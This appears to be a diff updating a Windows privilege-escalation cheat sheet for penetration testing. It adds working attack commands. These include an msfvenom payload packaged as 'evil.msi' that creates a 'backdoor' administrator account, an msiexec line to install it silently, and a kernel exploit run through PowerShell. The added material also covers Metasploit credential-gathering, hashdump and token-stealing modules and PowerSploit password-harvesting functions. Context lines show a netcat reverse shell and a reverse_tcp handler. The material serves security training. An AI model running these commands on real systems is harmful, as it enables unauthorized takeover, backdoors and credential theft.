@@ -7,7 +7,7 @@ Shell
     Getting a reverse shell
     *$ nc.exe -Lp 31337 -vv -e cmd.exe*
 
-EoP0: System info
+EoP 0: System info
     Find installed patches, architecture, OS version
     *$ systeminfo*
 
@@ -84,6 +84,9 @@ net start SSDPSRV
 net start upnphost*
     Or remove the dependency:
     *$ sc config upnphost depend= ""*
+    Using meterpreter:
+    *> exploit/windows/local/service_permissions*
+
 
 EoP2: Find unquoted paths
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
@@ -92,6 +95,10 @@ EoP2: Find unquoted paths
     *c:\Program Files\something\winamp.exe*
     We can place a binary like this
     *c:\program.exe*
+
+    Using meterpreter
+    *> exploit/windows/local/trusted_service_path*
+
 
 EoP3: ClearText passwords (quick hits)
     Search for them
@@ -129,9 +136,12 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password*
     Search for password in registry
     *$ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s*
+    Using meterpreter:
+    *> post/windows/gather/credentials/gpp
+    post/windows/gather/enum_unattend*
 
 
-EoP5: Services only available from loopback
+EoP4: Services only available from loopback
     You can find services bind to the loopback interface that are not reachable through the network running.look for LISTENING/LISTEN:
     *netstat -ano*
 
@@ -156,8 +166,39 @@ portfwd add -l 3306 -p 3306 -r 192.168.1.101*
 
     Compile windows exploit in linux:
     *$ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe*
+    Compiling python scripts to executables:
+    *$ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py*
 
-EoP6: Kernel exploits
+C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+
+EoP5: AlwaysInstallElevated
+    AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
+
+    Check if these 2 registry values are set to "1":
+
+    *$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated*
+
+    If they are, create your own malicious msi:
+
+    *$msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi*
+
+    Then use msiexec on victim to execute your msi:
+    *$ msiexec /quiet /qn /i C:\evil.msi*
+
+    Metasploit module:
+    *> use exploit/windows/local/always_install_elevated*
+
+
+EoP 6: Vulnerable drivers
+    Third party drivers might contain vulnerabilities, find them running:
+    *$ DRIVERQUERY*
+
+
+EoP 7: Kernel vulnerabilities
+    Run exploit suggester against systeminfo:
+    *$https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
+    python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt*
     Find installed paths:
     *$ wmic qfe get Caption,Description,HotFixID,InstalledOn*
     *Exploit-DB Vuln Name             MS#         2K         XP      2003      2008    Vista 7
@@ -224,6 +265,35 @@ Exploits worth looking at:
     MS11-046
     *https://github.com/SecWiki/windows-kernel-exploits*
 
+EoP8: Automated tools
+
+    Powersploit
+    *https://github.com/PowerShellMafia/PowerSploit
+Get-GPPPassword
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+Get-SiteListPassword
+Get-CachedGPPPassword
+Get-RegistryAutoLogon*
+
+    Metasploit
+    *post/windows/gather/credentials/gpp
+post/windows/gather/enum_unattend*
+    *getsystem
+getprivs
+use priv
+hashdump*
+
+    Metasploit incognito
+    *use incognito
+list_tokens -u
+list_tokens -g
+impersonate_token DOMAIN_NAME\\USERNAME
+steal_token PID
+drop_token
+rev2self*
+
 Useful commands
     Add a new user
     *$ net user test 1234 /add
@@ -238,7 +308,7 @@ $ net localgroup administrators test /add*
     *$ net user*
     Info about a user:
     *$ net user <username>*
-    Permissions on a folder recusively:
+    Permissions on a folder recursively:
     *$ cacls *.* /t /e /g domainname\administrator:f*
     tasklist or wmic process or tasklist /svc
     Enable RDP access
@@ -298,8 +368,8 @@ msfvenom -p generic/shell_reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f php -o she
     *msf > use exploit/multi/handler
 msf > set lport 1234
 msf > set lhost 10.11.0.123
-msf > set payload windows/shell/reverse_tcp*
-msf > run
+msf > set payload windows/shell/reverse_tcp
+msf > run*
     Other payloads:
     *set PAYLOAD windows/meterpreter/reverse_tcp
 set PAYLOAD linux/x86/meterpreter/reverse_tcp*
